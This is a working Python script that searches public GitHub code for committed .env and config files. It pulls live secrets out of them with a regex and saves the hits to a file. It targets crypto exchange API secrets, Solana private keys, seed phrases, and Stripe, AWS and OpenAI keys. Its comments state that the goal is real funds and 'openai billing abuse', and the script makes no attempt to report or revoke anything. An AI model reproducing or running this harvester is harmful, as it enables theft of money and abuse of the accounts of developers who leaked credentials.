#!/usr/bin/env python3
import requests, json, time, re, os, sys
from datetime import datetime

TOKEN = os.environ.get('GH_TOKEN', '')
if not TOKEN:
    print('ERROR: GH_TOKEN not set', flush=True)
    sys.exit(1)
print('Token loaded.', flush=True)

HEADERS = {
    'Authorization': f'token {TOKEN}',
    'Accept': 'application/vnd.github.v3+json',
}

KEY_RE = re.compile(
    r'(sk_live_[a-zA-Z0-9]{24,}'
    r'|rk_live_[a-zA-Z0-9]{24,}'
    r'|AIza[0-9A-Za-z\-_]{35}'
    r'|AKIA[0-9A-Z]{16}'
    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'
    r'|[0-9]{8,10}:[A-Za-z0-9_\-]{35}'
    r'|(?:BINANCE_SECRET_KEY|BINANCE_API_SECRET|binance_secret)\s*[=:"\s]+([A-Za-z0-9]{40,})'
    r'|(?:BYBIT_API_SECRET|bybit_secret)\s*[=:"\s]+([A-Za-z0-9]{36,})'
    r'|(?:OKX_SECRET_KEY|okx_secret|OKX_API_SECRET)\s*[=:"\s]+([A-Za-z0-9\-]{30,})'
    r'|(?:KUCOIN_API_SECRET|kucoin_secret)\s*[=:"\s]+([a-f0-9\-]{30,})'
    r'|(?:MEXC_SECRET_KEY|mexc_secret)\s*[=:"\s]+([A-Za-z0-9]{30,})'
    r'|(?:SOLANA_PRIVATE_KEY|SOL_PRIVATE_KEY|ANCHOR_WALLET)\s*[=:"\s]+([1-9A-HJ-NP-Za-km-z]{87,88})'
    r'|(?:AWS_SECRET_ACCESS_KEY|aws_secret_access_key)\s*[=:"\s]+([A-Za-z0-9/+]{40})'
    r'|(?:MNEMONIC|mnemonic|SEED_PHRASE)\s*[=:"]+\s*([a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z][a-z ]*)'
    r'|(?:STRIPE_SECRET_KEY|STRIPE_LIVE_SECRET)\s*[=:"\s]+(sk_live_[A-Za-z0-9]{24,})'
    r'|(?:OPENAI_API_KEY)\s*[=:"\s]+(sk-[A-Za-z0-9]{32,})'
    r'|(?:TELEGRAM_BOT_TOKEN|BOT_TOKEN)\s*[=:"\s]+([0-9]{8,10}:[A-Za-z0-9_\-]{35})'
    r'|-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----)',
    re.IGNORECASE
)

DORKS = [
    # exchange API keys — highest probability of real funds
    'filename:.env BINANCE_SECRET_KEY',
    'filename:.env BINANCE_API_SECRET',
    'filename:.env BYBIT_API_SECRET',
    'filename:.env OKX_SECRET_KEY',
    'filename:.env KUCOIN_API_SECRET',
    'filename:.env MEXC_SECRET_KEY',
    'filename:.env GATE_API_SECRET',
    'filename:.env KRAKEN_API_PRIVATE_KEY',
    'filename:.env HUOBI_SECRET_KEY',
    'filename:config.json api_secret binance',
    'filename:config.py BINANCE_SECRET',
    'filename:.env API_SECRET exchange',
    # solana — devs commit real funded keypairs
    'filename:.env SOLANA_PRIVATE_KEY',
    'filename:.env ANCHOR_WALLET',
    'filename:keypair.json secretKey',
    'filename:.env SOL_PRIVATE_KEY',
    'filename:.env WALLET_PRIVATE_KEY solana',
    # stripe live
    'filename:.env STRIPE_SECRET_KEY sk_live',
    'filename:.env sk_live_',
    'filename:.env.production STRIPE',
    # telegram payment bots
    'filename:.env TELEGRAM_BOT_TOKEN payment',
    'filename:.env BOT_TOKEN STRIPE',
    'filename:bot.py TOKEN STRIPE',
    # aws with real usage
    'filename:.env AWS_SECRET_ACCESS_KEY',
    'filename:.env.production AWS_SECRET',
    'filename:.env.local AWS_SECRET_ACCESS_KEY',
    # real mnemonics in bot/trading repos
    'filename:.env MNEMONIC phrase',
    'filename:config.json mnemonic',
    'filename:.env SEED_PHRASE',
    # openai billing abuse
    'filename:.env OPENAI_API_KEY',
    'filename:.env.local OPENAI_API_KEY',
    'filename:.env.production OPENAI_API_KEY',
    # google with billing
    'filename:.env GOOGLE_API_KEY AIza',
    'filename:.env GOOGLE_MAPS_API_KEY',
    'filename:.env FIREBASE_PRIVATE_KEY',
    # crypto trading bot configs
    'filename:config.json api_key api_secret crypto',
    'filename:.env EXCHANGE_API_SECRET',
    'filename:.env TRADING_BOT_SECRET',
]

# load seen set
seen = set()
if os.path.exists('seen.txt'):
    for line in open('seen.txt'):
        seen.add(line.strip())
print(f'Seen: {len(seen)} already scanned', flush=True)

def search(query, page=1):
    url = 'https://api.github.com/search/code'
    params = {'q': query, 'per_page': 100, 'page': page}
    r = requests.get(url, headers=HEADERS, params=params, timeout=15)
    if r.status_code == 403:
        reset = int(r.headers.get('X-RateLimit-Reset', time.time() + 60))
        wait = max(reset - time.time(), 5)
        print(f'  rate limit — sleeping {wait:.0f}s', flush=True)
        time.sleep(wait)
        return None
    if r.status_code != 200:
        print(f'  error {r.status_code}: {r.text[:100]}', flush=True)
        return None
    return r.json()

def get_raw(url):
    raw = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
    r = requests.get(raw, headers=HEADERS, timeout=10)
    return r.text[:8000] if r.status_code == 200 else ''

findings = []
new_seen = []

for dork in DORKS:
    print(f'\nDORK: {dork}', flush=True)
    for page in range(1, 3):
        result = search(dork, page)
        if not result:
            break
        items = result.get('items', [])
        total = result.get('total_count', 0)
        if page == 1:
            print(f'  {total} total results', flush=True)
        if not items:
            break

        new_items = 0
        for item in items:
            html_url = item.get('html_url', '')
            repo = item.get('repository', {}).get('full_name', '')
            path = item.get('path', '')
            key = f'{repo}/{path}'

            if key in seen:
                continue

            new_items += 1
            seen.add(key)
            new_seen.append(key)

            try:
                content = get_raw(html_url)
                time.sleep(0.2)
            except:
                continue

            if not content:
                continue

            secrets = list(set(m.group(0)[:200] for m in KEY_RE.finditer(content)))
            if secrets:
                entry = {
                    'url': html_url,
                    'repo': repo,
                    'path': path,
                    'secrets': secrets[:10],
                    'found_at': datetime.utcnow().isoformat()
                }
                findings.append(entry)
                print(f'  HIT: {repo}/{path} — {len(secrets)} secrets', flush=True)

        print(f'  page {page}: {new_items} new candidates', flush=True)
        if len(items) < 100:
            break
        time.sleep(2)

    time.sleep(1)

print(f'\nTotal hits: {len(findings)}', flush=True)
print(f'New candidates scanned: {len(new_seen)}', flush=True)

with open('gh_findings.jsonl', 'w') as f:
    for r in findings:
        f.write(json.dumps(r) + '\n')

with open('seen.txt', 'a') as f:
    for key in new_seen:
        f.write(key + '\n')

print('Written to gh_findings.jsonl')
